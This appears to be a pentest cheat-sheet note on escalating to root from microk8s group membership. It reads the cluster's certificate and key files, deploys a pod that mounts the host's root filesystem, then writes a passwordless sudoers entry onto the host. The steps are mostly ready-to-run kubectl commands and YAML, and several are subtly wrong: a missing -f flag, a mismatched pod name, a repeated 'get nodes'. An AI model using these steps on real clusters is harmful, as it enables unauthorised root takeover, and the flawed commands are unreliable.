1. Check if user is in the microk8 group
2. If the user is a member then he/she can read any files at /var/snap/microk8s/current/certs/. Of special interest are **server.crt**, **server.key**, and **ca.crt**
3. We can use these with kubectl to interact with the Kubernetes interface

```bash
./kubectl --client-certificate server.crt --client-key server.key --certificate-authority ca.crt --server server-ip:16443 get nodes
```

4. We can deploy a malicious pod 

badpod.yaml
```
apiVersion: v1
kind: Pod
metadata:
  name: mybadpod
spec:
  containers:
  - name: shell
    image: ubuntu:latest
    command: ["/bin/bash"]
    args: ["-c","sleep 10000"]
    volumeMounts:
    - name: root
      mountPath: /opt/host_root
  volumes:
  - name: root
    hostPath:
      path: /
      type: Directory
```

Deploy it
```bash
./kubectl --client-certificate server.crt --client-key server.key --certificate-authority ca.crt --server server-ip:16443 apply badpod.yaml
```

Verifiy that it runs
```bash
./kubectl --client-certificate server.crt --client-key server.key --certificate-authority ca.crt --server server-ip:16443 get nodes


./kubectl --client-certificate server.crt --client-key server.key --certificate-authority ca.crt --server server-ip:16443 get pods
```

Connect to the pod and modify the sudoers files to give any user sudo permission
```bash
./kubectl --client-certificate server.crt --client-key server.key --certificate-authority ca.crt --server server-ip:16443 exec -it badpod /bin/bash

echo "myuser ALL=(ALL) NOPASSWD:ALL" > ./etc/sudoers.d/myuser 
```
